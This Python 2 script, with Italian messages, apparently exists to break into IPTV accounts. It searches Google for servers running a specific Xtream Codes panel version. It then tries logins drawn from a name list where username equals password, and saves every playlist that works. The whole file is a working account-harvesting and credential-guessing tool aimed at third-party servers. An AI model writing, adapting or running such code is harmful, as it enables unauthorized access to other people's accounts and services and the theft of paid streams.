import urllib2
import google
import time
import pyprind
import os
import random
from urlparse import urlparse


class Crawler(object):
    outputDir = "output"
    basicString = "/get.php?username=%s&password=%s&type=m3u&output=mpegts"
    searchString = "Xtream Codes v1.0.59.5"

    
    def __init__(self, language = "it"):
        self.language = language.lower()
        self.parsedUrls = []
        self.foundedAccounts = 0

    
    def search_links(self):
        
        for url in google.search(self.searchString, num=15, stop=1):
            parsed = urlparse(url)
            self.parsedUrls.append(parsed.scheme + "://" + parsed.netloc)

    
    def search_accounts(self, url = None):
        if not self.parsedUrls:
            return "Devi prima ricercare qualche server"
        try:
            if not url:
                url = random.choice(self.parsedUrls)
            fileName = "names/" + self.language + ".txt"
            fileLength = self.file_length(fileName)
            progressBar = pyprind.ProgBar(fileLength, title = "Cercando account su " + url + " ci vorra un po di tempo.", stream = 1, monitor = True)
            foundedAccounts = 0
            with open(fileName) as f:
                rows = f.readlines()
            for row in rows:
                
                request = urllib2.Request(url + self.basicString % (row.rstrip().lstrip(), row.rstrip().lstrip()))
                response = urllib2.urlopen(request)
                fetched = response.read()
                

                fileLength = fileLength - 1
                progressBar.update()
                

                if len(fetched) > 0:
                    newPath = self.outputDir + "/" + url.replace("http://", "")
                    self.create_file(row, newPath, fetched)

            self.parsedUrls.remove(url)
        except urllib2.HTTPError, e:
            return "Ops, HTTPError exception . Non riesco ad raggiungere il seguente URL " + str(e.code)
        except urllib2.URLError, e:
            return "Ops,  URL sembra corrotto." + str(e.reason)
        except Exception:
            return "Ops qualcosa e andato storto!"
        finally:
            if self.foundedAccounts != 0:
                return "Ricerca conclusa , account trovato su " + url + ": " + str(self.foundedAccounts)
            else:
                return "Nessun Risultato per " + url

    
    def create_file(self, row, newPath, fetched):
        if os.path.exists(newPath) is False:
            os.makedirs(newPath)
        outputFile = open(str(newPath) + "/pjorIPTV_%s.m3u" % row.rstrip().lstrip(), "w")
        outputFile.write(fetched)
        self.foundedAccounts = self.foundedAccounts + 1
        outputFile.close()

    
    def file_length(self, fileName):
        with open(fileName) as f:
            for i, l in enumerate(f):
                pass
        return i + 1
